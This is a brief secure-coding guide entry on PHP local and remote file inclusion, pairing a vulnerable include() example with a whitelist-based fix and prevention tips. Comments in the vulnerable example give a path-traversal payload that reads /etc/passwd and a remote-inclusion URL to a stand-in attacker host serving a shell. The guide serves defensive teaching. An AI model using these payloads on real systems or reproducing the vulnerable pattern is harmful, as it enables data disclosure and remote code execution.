---
source: "languages/php/lfi-rfi.md"
title: "🐘 PHP LFI/RFI (Local/Remote File Inclusion)"
category: "language-vuln"
language: "php"
severity: "critical"
tags: [example, language-vuln, php, prevention, what]
---

# 🐘 PHP LFI/RFI (Local/Remote File Inclusion)

## What Is It?
Code like `include($_GET['page'])` includes a file controlled by the user. **LFI**: local file reading (`/etc/passwd`)
**RFI**: remote file inclusion → RCE

## Example
```php
// 💀 VULNERABLE:
$page = $_GET['page'];
include("pages/" . $page . ".php");
// page = "../../../../etc/passwd%00" → LFI
// page = "http://evil.com/shell.txt" → RFI (if allow_url_include=On)

// ✅ SECURE:
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';
if (in_array($page, $allowed_pages, true)) {
    include("pages/{$page}.php");
} else {
    include("pages/404.php");
}
```

## Prevention
- `allow_url_include = Off` (php.ini)
- Whitelist file paths
- Don't use user input in file paths

---

**Severity: 🔴 Critical** — RCE + Info disclosure.
